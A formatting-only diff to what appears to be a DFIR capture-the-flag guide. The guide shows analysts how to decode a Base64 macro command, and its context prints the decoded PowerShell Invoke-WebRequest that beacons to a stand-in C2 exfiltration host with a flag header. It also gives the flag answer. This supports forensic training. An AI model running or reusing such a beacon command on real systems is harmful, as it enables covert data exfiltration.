@@ -80,7 +80,9 @@ Follow these sequential steps in the interactive Marimo DFIR Console:
 DFIR analysts can deobfuscate the command line using either the live Python console or the interactive decoder:
 
 #### Option A: Live Python Deobfuscator
+
 Run or modify the pre-loaded script in the embedded Python scratchpad:
+
 ```python
 import base64, re
 
@@ -95,18 +97,20 @@ output
 ```
 
 #### Option B: Manual Decoder Widget
+
 1. Copy the Base64 string from the macro:
    `SW52b2tlLVdlYlJlcXVlc3QgaHR0cDovL2MyLWV4ZmlsLW5vZGUuZGFya25ldC1yb3V0aW5nLm9yZy9iZWFjb24gLUhlYWRlciBAe0tleT0iRkxBR3tkbWFyY19mYWlsX2ludm9pY2VfYzJfZG9tYWluX2RldGVjdGVkfSJ9`
 2. Paste it into the **Manual Base64 Decoder Input** box.
 3. Set **Encoding Format** to `UTF-8 / ASCII` or `UTF-16LE`.
 
 #### Decoded PowerShell Output:
+
 ```powershell
 Invoke-WebRequest http://c2-exfil-node.darknet-routing.org/beacon -Header @{Key="FLAG{dmarc_fail_invoice_c2_domain_detected}"}
 ```
 
-* **C2 Beacon URI**: `http://c2-exfil-node.darknet-routing.org/beacon`
-* **Exfiltration / Authentication Header**: `FLAG{dmarc_fail_invoice_c2_domain_detected}`
+- **C2 Beacon URI**: `http://c2-exfil-node.darknet-routing.org/beacon`
+- **Exfiltration / Authentication Header**: `FLAG{dmarc_fail_invoice_c2_domain_detected}`
 
 ---
 
